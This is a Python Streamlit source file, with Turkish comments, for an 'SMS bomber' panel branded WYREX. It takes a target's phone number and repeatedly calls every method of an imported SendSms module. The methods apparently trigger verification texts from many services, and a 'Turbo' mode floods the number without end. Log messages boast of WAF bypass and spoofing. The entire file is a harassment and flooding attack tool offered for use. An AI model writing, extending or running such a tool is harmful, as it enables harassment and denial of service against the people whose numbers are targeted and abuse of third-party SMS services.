# -*- coding: utf-8 -*-
"""
================================================================================
                     WYREX SYSTEM ADVANCED WARFARE INTERFACE                     
          CORE VERSION: 9.8.5-ULTIMATE-RELEASE [OVERCLOCKED EDITION]            
          DESIGNED BY : AREXZY & WILLIAM | SECURITY PROTOCOLS © 2026            
================================================================================
"""

import streamlit as st
import time
import re
import os
from datetime import datetime

# Streamlit uygulama pencerelerinin konfigürasyonu
st.set_page_config(
    page_title="WYREX SYSTEM v9.8.5",
    page_icon="🔴",
    layout="centered",
    initial_sidebar_state="collapsed"
)

# Sunucu uyumlu ekran temizleme fonksiyonu (Hataları önlemek için)
def ekranı_temizle():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
    except:
        pass

# Modül kontrolü
try:
    from sms import SendSms
except ImportError:
    st.error("CRITICAL FAULT: 'sms.py' çekirdek modülü ana dizinde doğrulanamadı!")

# ==============================================================================
# AGRESİF CSS KATMANI (Mobil beyaz ekran ve input çakışma engelleme)
# ==============================================================================
st.markdown("""
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Fira+Code:wght@400;500;700&display=swap');
        
        * {
            font-family: 'Share Tech Mono', monospace !important;
        }
        
        .stApp {
            background: radial-gradient(circle at center, #1e0002 0%, #030001 100%) !important;
            overflow-x: hidden;
        }
        
        .geliştirici-imzasi {
            position: absolute;
            top: -42px;
            left: -10px;
            color: #ff1a22;
            font-size: 14px;
            font-weight: bold;
            letter-spacing: 2px;
            opacity: 0.85;
            text-shadow: 0 0 10px rgba(255, 26, 34, 0.8);
        }

        .siber-izgara-layer {
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: linear-gradient(rgba(30, 2, 4, 0) 95%, rgba(255, 26, 34, 0.015) 95%),
                        linear-gradient(90deg, rgba(30, 2, 4, 0) 95%, rgba(255, 26, 34, 0.015) 95%);
            background-size: 40px 40px;
            pointer-events: none;
            z-index: 0;
        }

        .kalkan-kapsayici {
            text-align: center;
            margin-top: 15px;
            margin-bottom: -5px;
        }
        .kalkan-vektoru {
            font-size: 50px;
            color: #ff1a22;
            filter: drop-shadow(0 0 15px #ff0000);
        }
        
        .ana-siber-baslik {
            text-align: center;
            color: #ffffff;
            font-size: 46px;
            font-weight: 700;
            letter-spacing: 4px;
            margin-bottom: 0px;
            text-transform: uppercase;
        }
        .ana-siber-baslik span {
            color: #ff1a22 !important;
            text-shadow: 0 0 12px rgba(255, 26, 34, 0.9), 0 0 30px rgba(255, 0, 0, 0.4);
        }
        
        .ana-siber-aciklama {
            text-align: center;
            color: #7c7c7c;
            font-size: 13px;
            letter-spacing: 1.5px;
            margin-bottom: 40px;
        }
        
        label {
            color: #d6242b !important;
            font-size: 13.5px !important;
            font-weight: bold !important;
            letter-spacing: 1.5px !important;
            text-transform: uppercase;
        }
        
        .stTextInput > div, .stTextInput div[data-baseweb="input"] {
            background-color: #0c0203 !important;
            background: #0c0203 !important;
            border: 1px solid #4a0a0d !important;
        }

        .stTextInput div[data-baseweb="input"]:focus-within, 
        .stTextInput input:focus, 
        .stTextInput input:active {
            background-color: #0c0203 !important;
            background: #0c0203 !important;
            border: 1px solid #ff1a22 !important;
            box-shadow: 0 0 12px rgba(255, 26, 34, 0.4) !important;
        }
        
        .stTextInput input {
            color: #ffffff !important;
            background-color: #0c0203 !important;
            background: #0c0203 !important;
            -webkit-text-fill-color: #ffffff !important; 
            font-family: 'Fira Code', monospace !important;
        }

        div[data-baseweb="select"] {
            background-color: #0c0203 !important;
            background: #0c0203 !important;
            border: 1px solid #4a0a0d !important;
        }
        div[data-baseweb="select"] * {
            color: #ffffff !important;
            background-color: transparent !important;
        }

        div.stButton > button {
            background: linear-gradient(135deg, #2b0104 0%, #080000 100%) !important;
            color: #ffffff !important;
            border: 1px solid #821418 !important;
            border-radius: 1px !important;
            padding: 14px 0px !important;
            font-size: 16px !important;
            font-weight: bold !important;
            letter-spacing: 4px !important;
            text-transform: uppercase;
            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.6);
            transition: all 0.4s ease;
        }
        div.stButton > button:hover {
            background: #ff1a22 !important;
            border: 1px solid #ff1a22 !important;
            box-shadow: 0 0 25px rgba(255, 26, 34, 0.6);
        }

        .terminal-log-kutusu {
            background-color: #020000 !important;
            border-left: 4px solid #ff1a22 !important;
            border-top: 1px solid #240305 !important;
            border-bottom: 1px solid #240305 !important;
            border-right: 1px solid #240305 !important;
            padding: 15px !important;
            margin-bottom: 8px;
            font-family: 'Fira Code', monospace !important;
        }
        
        .ayirici-cizgi {
            border: 0;
            height: 1px;
            background: linear-gradient(to right, transparent, #54070a, #ff1a22, #54070a, transparent);
            margin: 30px 0;
        }
    </style>
""", unsafe_allow_html=True)

st.markdown('<div class="siber-izgara-layer"></div>', unsafe_allow_html=True)
st.markdown('<div class="geliştirici-imzasi">by : arexzy & william</div>', unsafe_allow_html=True)
st.markdown('<div class="kalkan-kapsayici"><div class="kalkan-vektoru">🛡️</div></div>', unsafe_allow_html=True)
st.markdown('<div class="ana-siber-baslik"><span>wyrex</span> System</div>', unsafe_allow_html=True)
st.markdown('<div class="ana-siber-aciklama">Advanced Multi-Agent Network Warfare - Operation Control Desk</div>', unsafe_allow_html=True)

if "saldiri_aktif" not in st.session_state:
    st.session_state.saldiri_aktif = False

# Giriş Alanları
numara_input = st.text_input("HEDEF KOORDİNAT (TELEFON NUMARASI):", placeholder="Örn: 5051234567")
mail_input = st.text_input("E-POSTA ADRESİ (ZORUNLU PROTOKOL):", placeholder="Örn: test@gmail.com", value="arexzy_panel@gmail.com")

mod = st.selectbox(
    "OPERASYON MODÜLÜ SEÇİNİZ:",
    ["Seçim Yapınız...", "1- SMS Gönder (Normal Mod - Belirli İstek)", "2- SMS Gönder (Turbo Mod - Aşırı Yoğun Akış)"]
)

miktar = 0
if mod == "1- SMS Gönder (Normal Mod - Belirli İstek)":
    st.write("")
    miktar = st.slider("İLETİLECEK VERİ PAKETİ MİKTARI:", min_value=1, max_value=100, value=15)

st.markdown('<div class="ayirici-cizgi"></div>', unsafe_allow_html=True)

def terminal_logu_uret(mesaj, durum_tipi="info"):
    zaman_damgasi = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    if durum_tipi == "danger":
        tag = "<span style='color: #ff1a22; font-weight:bold;'>[CORE_OVERFLOW]</span>"
        text_color = "#ff666b"
    elif durum_tipi == "success":
        tag = "<span style='color: #00ff66; font-weight:bold;'>[PACKET_OK]</span>"
        text_color = "#c2ffd7"
    elif durum_tipi == "warn":
        tag = "<span style='color: #ffea00; font-weight:bold;'>[BYPASS_WAF]</span>"
        text_color = "#fff6b3"
    else:
        tag = "<span style='color: #00bfff; font-weight:bold;'>[GRID_ROUTING]</span>"
        text_color = "#ffffff"
        
    return f"""
    <div class="terminal-log-kutusu">
        <span style="color: #666666; font-size:12px;">[{zaman_damgasi}]</span> {tag} 
        <span style="color: {text_color}; font-size: 13.5px;">{mesaj}</span>
    </div>
    """

if not st.session_state.saldiri_aktif:
    if st.button("SİSTEMİ TETİKLE / BAŞLAT ⚡", use_container_width=True):
        if not numara_input:
            st.error("INTEGRITY ERROR: Hedef numara veritabanı boş bırakılamaz.")
        elif not mail_input:
            st.error("INTEGRITY ERROR: E-posta alanı boş bırakılamaz. Kodun çalışması için bu parametre zorunludur.")
        elif mod == "Seçim Yapınız...":
            st.error("INTEGRITY ERROR: Yürütülecek operasyonel algoritma seçilmedi.")
        else:
            cleaned_number = re.sub(r"\D", "", numara_input)
            if cleaned_number.startswith("0"):
                cleaned_number = cleaned_number[1:]
            
            if len(cleaned_number) != 10:
                st.error("SECURITY DISCREPANCY: Numara standardı dışı veri tespiti (10 Hane Zorunludur).")
            else:
                st.session_state.saldiri_aktif = True
                st.session_state.temiz_numara = cleaned_number
                st.session_state.girilen_mail = mail_input
                st.session_state.secilen_mod = mod
                st.session_state.miktar = miktar
                st.rerun()

if st.session_state.saldiri_aktif:
    st.markdown("<p style='color: #ff1a22; text-align: center; font-weight: bold; font-size: 14px; letter-spacing: 2px;'>🔴 SYSTEM MATRIX ACTIVE: DISTRIBUTED DATA TRANSMISSION IN PROGRESS</p>", unsafe_allow_html=True)
    
    if st.button("❌ OPERASYONU ACİL DURDUR (KILL SCRIPT)", use_container_width=True):
        st.session_state.saldiri_aktif = False
        st.rerun()

    target_no = st.session_state.temiz_numara
    target_mail = st.session_state.girilen_mail
    selected_sub_mod = st.session_state.secilen_mod
    
    log_slot_1 = st.empty()
    log_slot_2 = st.empty()

    try:
        # 🚨 KRİTİK DÜZELTME: hem numara hem de mail parametreleri tam olarak sms.py'nin istediği sıra ile gönderiliyor!
        sms_instance = SendSms(target_no, target_mail)
        api_methods_pool = [attr for attr in dir(SendSms) if callable(getattr(SendSms, attr)) and not attr.startswith('__')]

        ekranı_temizle()

        if "Normal Mod" in selected_sub_mod:
            loop_limit = st.session_state.miktar
            for current_loop_idx in range(loop_limit):
                if not st.session_state.saldiri_aktif: break
                for api_idx, specific_method_name in enumerate(api_methods_pool):
                    if not st.session_state.saldiri_aktif: break
                    try:
                        getattr(sms_instance, specific_method_name)()
                        log_slot_1.markdown(terminal_logu_uret(f"API Veri Paketi Gönderildi -> [{specific_method_name.upper()}]", "success"), unsafe_allow_html=True)
                    except:
                        pass
                    time.sleep(0.05)
                log_slot_2.markdown(terminal_logu_uret(f"Döngü Tamamlandı: [{current_loop_idx+1}/{loop_limit}]", "warn"), unsafe_allow_html=True)
            st.session_state.saldiri_aktif = False
            st.success("SUCCESS: Döngü başarıyla tamamlandı.")
            time.sleep(1.5)
            st.rerun()

        elif "Turbo Mod" in selected_sub_mod:
            turbo_counter = 0
            while st.session_state.saldiri_aktif:
                turbo_counter += 1
                for specific_method_name in api_methods_pool:
                    if not st.session_state.saldiri_aktif: break
                    try: 
                        getattr(sms_instance, specific_method_name)()
                    except: 
                        pass
                log_slot_1.markdown(terminal_logu_uret(f"HIGH-SPEED FLOOD: Atak döngüsü #{turbo_counter} aktif.", "success"), unsafe_allow_html=True)
                log_slot_2.markdown(terminal_logu_uret(f"SPOOFED PIPELINE: Paketler arka arkaya maskelenerek basılıyor.", "warn"), unsafe_allow_html=True)
                time.sleep(0.1)

    except Exception as fatal_exception:
        st.markdown(terminal_logu_uret(f"CRITICAL MATRIX FALLBACK: {str(fatal_exception)}", "danger"), unsafe_allow_html=True)
        st.session_state.saldiri_aktif = False

st.markdown("<div style='margin-top: 120px;'></div>", unsafe_allow_html=True)
st.markdown("<p style='text-align: center; color: #280305; font-size: 11px; letter-spacing: 3px; font-weight: bold;'>WYREX DEFENSE TECHNOLOGIES CO. LTD. // CLASSIFIED HARDWARE SOURCE</p>", unsafe_allow_html=True)
